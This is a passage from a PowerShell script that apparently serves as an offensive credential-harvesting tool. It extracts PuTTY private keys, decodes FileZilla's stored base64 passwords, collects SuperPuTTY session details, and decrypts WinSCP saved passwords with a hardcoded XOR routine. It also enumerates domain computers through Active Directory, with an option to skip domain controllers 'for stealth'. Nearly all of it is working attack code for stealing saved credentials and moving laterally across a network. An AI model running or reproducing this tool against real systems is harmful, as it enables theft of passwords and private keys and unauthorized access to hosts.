      Write-Output "Microsoft RDP Connection Files (.rdp)"
      $ArrayOfRDPFiles | Select-Object * | Format-List | Out-String
    }

  }

} # Process RDP File

function ProcessPPKFile($PPKExtensionFilesINodes) {

  # Extracting the filepath from the i-node information stored in PPKExtensionFilesINodes
  foreach ($Path in $PPKExtensionFilesINodes.VersionInfo.FileName) {

    # Private Key Encryption property identifies whether the private key in this file is encrypted or if it can be used as is
    $PPKFileObject = "" | Select-Object -Property "Source","Path","Protocol","Comment","Private Key Encryption","Private Key","Private MAC"

    $PPKFileObject."Source" = (Hostname)

    # The next several lines use regex pattern matching to store relevant info from the .ppk file into our object
    $PPKFileObject."Path" = $Path

    $PPKFileObject."Protocol" = try { (Select-String -Path $Path -Pattern ": (.*)" -Context 0,0).Matches.Groups[1].Value } catch {}
    $PPKFileObject."Private Key Encryption" = try { (Select-String -Path $Path -Pattern "Encryption: (.*)").Matches.Groups[1].Value } catch {}
    $PPKFileObject."Comment" = try { (Select-String -Path $Path -Pattern "Comment: (.*)").Matches.Groups[1].Value } catch {}
    $NumberOfPrivateKeyLines = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)").Matches.Groups[1].Value } catch {}
    $PPKFileObject."Private Key" = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)" -Context 0,$NumberOfPrivateKeyLines).Context.PostContext -Join "" } catch {}
    $PPKFileObject."Private MAC" = try { (Select-String -Path $Path -Pattern "Private-MAC: (.*)").Matches.Groups[1].Value } catch {}

    # Add the object we just created to the array of .ppk file objects
    [void]$ArrayOfPPKFiles.Add($PPKFileObject)

  }

  if ($ArrayOfPPKFiles.count -gt 0) {

    $UserObject | Add-Member -MemberType NoteProperty -Name "PPK Files" -Value $ArrayOfPPKFiles

    if ($OutCSV) {
      $ArrayOfPPKFiles | Select-Object * | Export-CSV -Append -Path ($OutputDirectory + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Output "PuTTY Private Key Files (.ppk)"
      $ArrayOfPPKFiles | Select-Object * | Format-List | Out-String
    }

  }

} # Process PPK File

function ProcessFileZillaFile($FileZillaXML) {

  # Locate all <Server> nodes (aka session nodes), iterate over them
  foreach($FileZillaSession in $FileZillaXML.SelectNodes('//FileZilla3/Servers/Server')) {
      # Hashtable to store each session's data
      $FileZillaSessionHash = @{}

      # Iterates over each child node under <Server> (aka session)
      $FileZillaSession.ChildNodes | ForEach-Object {

          $FileZillaSessionHash["Source"] = $Source
          # If value exists, make a key-value pair for it in the hash table
          if ($_.InnerText) {
              if ($_.Name -eq "Pass") {
                  $FileZillaSessionHash["Password"] = $_.InnerText
              } else {
                  # Populate session data based on the node name
                  $FileZillaSessionHash[$_.Name] = $_.InnerText
              }
              
          }

      }

    # Create object from collected data, excluding some trivial information
    [void]$ArrayOfFileZillaSessions.Add((New-Object PSObject -Property $FileZillaSessionHash | Select-Object -Property * -ExcludeProperty "#text",LogonType,Type,BypassProxy,SyncBrowsing,PasvMode,DirectoryComparison,MaximumMultipleConnections,EncodingType,TimezoneOffset,Colour))
     
  } # ForEach FileZillaSession in FileZillaXML.SelectNodes()
  
  # base64_decode the stored encoded session passwords, and decode protocol
  foreach ($Session in $ArrayOfFileZillaSessions) {
      $Session.Password = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($Session.Password))
      if ($Session.Protocol -eq "0") {
        $Session.Protocol = "Use FTP over TLS if available"
      } elseif ($Session.Protocol -eq 1) {
        $Session.Protocol = "Use SFTP"
      } elseif ($Session.Protocol -eq 3) {
        $Session.Protocol = "Require implicit FTP over TLS"
      } elseif ($Session.Protocol -eq 4) {
        $Session.Protocol = "Require explicit FTP over TLS"
      } elseif ($Session.Protocol -eq 6) {
        $Session.Protocol = "Only use plain FTP (insecure)"
      } 
  }

  if ($OutCSV) {
    $ArrayOfFileZillaSessions | Export-CSV -Append -Path ($OutputDirectory + "\FileZilla.csv") -NoTypeInformation
  } else {
    Write-Output "FileZilla Sessions"
    $ArrayOfFileZillaSessions | Format-List | Out-String
  }

  # Add the array of FileZilla session objects to the target user object
  $UserObject | Add-Member -MemberType NoteProperty -Name "FileZilla Sessions" -Value $ArrayOfFileZillaSessions

} # ProcessFileZillaFile

function ProcessSuperPuTTYFile($SuperPuTTYXML) {

  foreach($SuperPuTTYSessions in $SuperPuTTYXML.ArrayOfSessionData.SessionData) {

    foreach ($SuperPuTTYSession in $SuperPuTTYSessions) { 
      if ($SuperPuTTYSession -ne $null) {

        $SuperPuTTYSessionObject = "" | Select-Object -Property "Source","SessionId","SessionName","Host","Username","ExtraArgs","Port","Putty Session"

        $SuperPuTTYSessionObject."Source" = $Source
        $SuperPuTTYSessionObject."SessionId" = $SuperPuTTYSession.SessionId
        $SuperPuTTYSessionObject."SessionName" = $SuperPuTTYSession.SessionName
        $SuperPuTTYSessionObject."Host" = $SuperPuTTYSession.Host
        $SuperPuTTYSessionObject."Username" = $SuperPuTTYSession.Username
        $SuperPuTTYSessionObject."ExtraArgs" = $SuperPuTTYSession.ExtraArgs
        $SuperPuTTYSessionObject."Port" = $SuperPuTTYSession.Port
        $SuperPuTTYSessionObject."PuTTY Session" = $SuperPuTTYSession.PuttySession

        [void]$ArrayOfSuperPuTTYSessions.Add($SuperPuTTYSessionObject)
      } 
    }

  } # ForEach SuperPuTTYSessions

  if ($OutCSV) {
    $ArrayOfSuperPuTTYSessions | Export-CSV -Append -Path ($OutputDirectory + "\SuperPuTTY.csv") -NoTypeInformation
  } else {
    Write-Output "SuperPuTTY Sessions"
    $ArrayOfSuperPuTTYSessions | Out-String
  }

  # Add the array of SuperPuTTY session objects to the target user object
  $UserObject | Add-Member -MemberType NoteProperty -Name "SuperPuTTY Sessions" -Value $ArrayOfSuperPuTTYSessions

} # ProcessSuperPuTTYFile

####################################################################################
####################################################################################
## WinSCP Deobfuscation Helper Functions
####################################################################################
####################################################################################

# Gets all domain-joined computer names and properties in one object
function GetComputersFromActiveDirectory {

  $objDomain = New-Object System.DirectoryServices.DirectoryEntry
  $objSearcher = New-Object System.DirectoryServices.DirectorySearcher
  $objSearcher.SearchRoot = $objDomain
  if ($ExcludeDC) {
      Write-Verbose "Skipping enumeration against the Domain Controller(s) for stealth."
      $Filter = "(&(objectCategory=computer)(!userAccountControl:1.2.840.113556.1.4.803:=8192))"
    } else {
      $Filter = "(objectCategory=computer)"
    }
      
  $objSearcher.Filter = $Filter

  $colProplist = "name"

  foreach ($i in $colPropList){$objSearcher.PropertiesToLoad.Add($i)}

  $objSearcher.FindAll()

}

function DecryptNextCharacterWinSCP($remainingPass) {

  # Creates an object with flag and remainingPass properties
  $flagAndPass = "" | Select-Object -Property flag,remainingPass

  # Shift left 4 bits equivalent for backwards compatibility with older PowerShell versions
  $firstval = ("0123456789ABCDEF".indexOf($remainingPass[0]) * 16)
  $secondval = "0123456789ABCDEF".indexOf($remainingPass[1])

  $Added = $firstval + $secondval

  $decryptedResult = (((-bnot ($Added -bxor $Magic)) % 256) + 256) % 256

  $flagAndPass.flag = $decryptedResult
  $flagAndPass.remainingPass = $remainingPass.Substring(2)

   $flagAndPass

}

function DecryptWinSCPPassword($SessionHostname, $SessionUsername, $Password) {

  $CheckFlag = 255
  $Magic = 163

  $len = 0
  $key =  $SessionHostname + $SessionUsername
  $values = DecryptNextCharacterWinSCP($Password)

  $storedFlag = $values.flag 

  if ($values.flag -eq $CheckFlag) {
    $values.remainingPass = $values.remainingPass.Substring(2)
    $values = DecryptNextCharacterWinSCP($values.remainingPass)
  }

  $len = $values.flag

  $values = DecryptNextCharacterWinSCP($values.remainingPass)
  $values.remainingPass = $values.remainingPass.Substring(($values.flag * 2))

  $finalOutput = ""
  for ($i=0; $i -lt $len; $i++) {
    $values = (DecryptNextCharacterWinSCP($values.remainingPass))
    $finalOutput += [char]$values.flag
  }

  if ($storedFlag -eq $CheckFlag) {
     $finalOutput.Substring($key.length)
  }

   $finalOutput

}


